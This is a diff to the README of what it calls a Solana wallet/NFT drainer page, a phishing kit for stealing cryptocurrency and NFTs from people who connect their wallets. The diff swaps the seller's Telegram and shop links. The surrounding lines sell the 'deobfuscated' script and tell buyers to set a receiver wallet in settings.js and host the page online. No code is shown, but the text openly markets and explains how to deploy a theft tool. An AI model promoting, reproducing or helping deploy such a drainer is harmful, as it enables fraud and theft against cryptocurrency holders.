@@ -1,8 +1,8 @@
-# ⚠️ You need to host it on a real website for it to work! To Buy The Full Clean & Deobfuscated Script Or For Any Other Types Of Scripts & Development Orders Message Me On: https://t.me/zefnftservices
+# ⚠️ You need to host it on a real website for it to work! To Buy The Full Clean & Deobfuscated Script Or For Any Other Types Of Scripts & Development Orders Message Me On: https://t.me/ox_services
 ----
 ## 🤑 SOLANA WALLET/NFT DRAINER PAGE
 
-![@zefnftservices](https://github.com/0xServices/0xServices/blob/main/gif.gif?raw=true)
+![@ox_services](https://github.com/0xServices/0xServices/blob/main/gif.gif?raw=true)
 ----
 
 ## 📌 Features
@@ -23,10 +23,10 @@ You need to edit the **settings.js** file to change the solana receiver wallet.
 
 After it, you're done. You only need to host the website to any hosting service
 
-To get instant support, contact us on [Telegram](https://t.me/zefnftservices)
+To get instant support, contact us on [Telegram](https://t.me/ox_services)
 
 
 ## 📍 Socials
 
-- Telegram Group: https://t.me/zefnftservices
-- Shop: https://zefnftservices.sellix.io/
+- Telegram Group: https://t.me/ox_services
+- Shop: https://0xservices.sellix.io/
